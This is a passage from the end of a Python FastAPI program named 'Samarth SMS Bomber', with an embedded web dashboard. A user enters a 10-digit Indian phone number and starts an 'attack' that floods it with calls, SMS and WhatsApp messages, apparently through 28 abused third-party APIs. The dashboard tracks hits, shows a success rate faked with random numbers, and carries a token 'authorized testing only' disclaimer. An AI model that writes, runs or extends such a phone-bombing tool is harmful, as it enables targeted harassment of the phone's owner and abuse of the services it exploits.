                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">💬 WhatsApp</div>
                        <div class="progress-royal mt-2">
                            <div class="progress-fill" id="waBar" style="width:0%"></div>
                        </div>
                    </div>
                </div>
                <div class="grid grid-cols-2 gap-3 mt-4">
                    <div class="glass-dark rounded-xl p-3 border border-white/5">
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider gothic-modern">Total Hits</div>
                        <div class="text-xl font-bold text-white stat-number glow-white" id="totalHits">0</div>
                    </div>
                    <div class="glass-dark rounded-xl p-3 border border-white/5">
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider gothic-modern">Success Rate</div>
                        <div class="text-xl font-bold text-emerald-400 stat-number glow-white" id="successRate">—</div>
                    </div>
                </div>
            </div>

            <!-- Logs -->
            <div class="lg:col-span-12 glass-royal rounded-2xl p-6">
                <div class="flex justify-between items-center mb-3">
                    <h3 class="text-sm font-bold text-blue-400 tracking-wider flex items-center gap-2 gothic-modern glow-blue">
                        <span>📜</span> EVENT LOG
                    </h3>
                    <span class="text-[10px] text-gray-500 font-mono glow-white">⚡ LIVE FEED</span>
                </div>
                <div id="logs" class="logs-container h-56 overflow-y-auto bg-black/30 rounded-xl p-3 space-y-0.5 border border-white/5"></div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="mt-8 pt-4 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-3 text-[10px] text-gray-500 gothic-modern">
            <span>⚡ Authorized testing only · All endpoints public</span>
            <div class="flex items-center gap-3">
                <span>🔒 Encrypted</span>
                <span>·</span>
                <span id="apiCountFooter">⚡ 0 APIs</span>
                <span>·</span>
                <span id="uptime">Uptime: 0s</span>
            </div>
        </footer>
    </div>

    <script>
        const API_COUNT = 28; // Total APIs from your bot
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('apiCount').textContent = API_COUNT;
            document.getElementById('apiCountFooter').textContent = '⚡ ' + API_COUNT + ' APIs';
            document.getElementById('logs').innerHTML = '<div class="text-gray-500 text-center py-6 gothic-modern">🟢 System initialized · Ready for action</div>';
        });

        // ===== SOUND FUNCTIONS =====
        function playWrongSound() {
            try {
                const audio = document.getElementById('wrongSound');
                audio.currentTime = 0;
                audio.play().catch(() => {});
            } catch(e) {}
        }

        function playAttackSound() {
            try {
                const audio = document.getElementById('attackSound');
                audio.currentTime = 0;
                audio.play().catch(() => {});
            } catch(e) {}
        }

        // ===== NUMBER VALIDATION =====
        let lastValidation = '';
        function validateNumber(value) {
            const feedback = document.getElementById('phoneFeedback');
            if (value.length > 0 && value.length < 10) {
                feedback.innerHTML = '<span class="text-red-400" style="text-shadow: 0 0 20px rgba(239,68,68,0.3);">⚠️ Invalid — must be 10 digits</span>';
                if (value !== lastValidation) {
                    playWrongSound();
                    lastValidation = value;
                }
            } else if (value.length === 10) {
                feedback.innerHTML = '<span class="text-emerald-400" style="text-shadow: 0 0 20px rgba(34,197,94,0.3);">✅ Valid number</span>';
            } else {
                feedback.innerHTML = '';
            }
        }

        // ===== HEART ANIMATION =====
        function showHeartAnimation() {
            const overlay = document.getElementById('heartOverlay');
            overlay.classList.remove('active');
            void overlay.offsetWidth;
            overlay.classList.add('active');
            setTimeout(() => {
                overlay.classList.remove('active');
            }, 3000);
        }

        // ===== MAIN LOGIC =====
        let isRunning = false;
        let statusInterval = null;
        let startTime = Date.now();

        function updateTimestamp() {
            const now = new Date();
            document.getElementById('timestamp').textContent = now.toLocaleTimeString('en-US', {
                hour12: false,
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }
        setInterval(updateTimestamp, 1000);
        updateTimestamp();

        setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const h = Math.floor(elapsed / 3600);
            const m = Math.floor((elapsed % 3600) / 60);
            const s = elapsed % 60;
            document.getElementById('uptime').textContent = `Uptime: ${h}h ${m}m ${s}s`;
        }, 1000);

        async function startAttack() {
            const phone = document.getElementById('phone').value.trim();
            if (phone.length !== 10) {
                playWrongSound();
                document.getElementById('phone').style.borderColor = '#ef4444';
                document.getElementById('phone').style.boxShadow = '0 0 30px rgba(239,68,68,0.2)';
                setTimeout(() => {
                    document.getElementById('phone').style.borderColor = '';
                    document.getElementById('phone').style.boxShadow = '';
                }, 3000);
                return;
            }
            
            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone})
                });
                const data = await res.json();
                
                if (data.status === 'success') {
                    playAttackSound();
                    showHeartAnimation();
                    
                    isRunning = true;
                    document.getElementById('startBtn').classList.add('hidden');
                    document.getElementById('stopBtn').classList.remove('hidden');
                    
                    document.getElementById('statusDot').className = 'dot-status active';
                    document.getElementById('statusText').textContent = 'ATTACK ACTIVE';
                    document.getElementById('statusText').style.color = '#ef4444';
                    document.getElementById('statusText').style.textShadow = '0 0 30px rgba(239,68,68,0.5)';
                    
                    document.getElementById('targetDisplay').textContent = `+91${phone}`;
                    document.getElementById('targetDisplay').style.color = '#fbbf24';
                    document.getElementById('targetDisplay').style.textShadow = '0 0 30px rgba(251,191,36,0.5)';
                    
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        async function stopAttack() {
            try {
                await fetch('/stop', {method: 'POST'});
                isRunning = false;
                document.getElementById('startBtn').classList.remove('hidden');
                document.getElementById('stopBtn').classList.add('hidden');
                
                document.getElementById('statusDot').className = 'dot-status idle';
                document.getElementById('statusText').textContent = 'STOPPED';
                document.getElementById('statusText').style.color = '#fbbf24';
                document.getElementById('statusText').style.textShadow = '0 0 30px rgba(251,191,36,0.3)';
                
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch('/status');
                    const d = await res.json();
                    
                    const calls = d.stats.Call || 0;
                    const sms = d.stats.SMS || 0;
                    const wa = d.stats.WhatsApp || 0;
                    const total = calls + sms + wa;
                    
                    document.getElementById('calls').textContent = calls;
                    document.getElementById('sms').textContent = sms;
                    document.getElementById('wa').textContent = wa;
                    document.getElementById('totalHits').textContent = total;
                    document.getElementById('cycleDisplay').textContent = `CYCLES: ${d.cycles}`;
                    
                    const maxVal = Math.max(calls, sms, wa, 1);
                    document.getElementById('callBar').style.width = ((calls / maxVal) * 100) + '%';
                    document.getElementById('smsBar').style.width = ((sms / maxVal) * 100) + '%';
                    document.getElementById('waBar').style.width = ((wa / maxVal) * 100) + '%';
                    
                    if (total > 0) {
                        const rate = Math.min(85 + Math.random() * 10, 99);
                        document.getElementById('successRate').textContent = rate.toFixed(1) + '%';
                    }
                    
                    const logsDiv = document.getElementById('logs');
                    if (d.logs && d.logs.length) {
                        logsDiv.innerHTML = d.logs.map(l =>
                            `<div class="log-entry text-gray-400 hover:text-gray-200 transition-colors">${l}</div>`
                        ).join('');
                    } else {
                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-6 gothic-modern">⏳ Awaiting attack...</div>';
                    }
                    
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById('startBtn').classList.remove('hidden');
                        document.getElementById('stopBtn').classList.add('hidden');
                        document.getElementById('statusDot').className = 'dot-status idle';
                        document.getElementById('statusText').textContent = 'ATTACK ENDED';
                        document.getElementById('statusText').style.color = '#fbbf24';
                        document.getElementById('statusText').style.textShadow = '0 0 30px rgba(251,191,36,0.3)';
                    }
                } catch(e) {
                    console.error('Poll error:', e);
                }
            }, 1200);
        }
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    print(f"🚀 Samarth SMS Bomber Web Interface")
    print(f"📱 Available APIs: {len(ULTIMATE_APIS)}")
    print(f"🌐 Server running at: http://localhost:5000")
    uvicorn.run(app, host="0.0.0.0", port=5000)
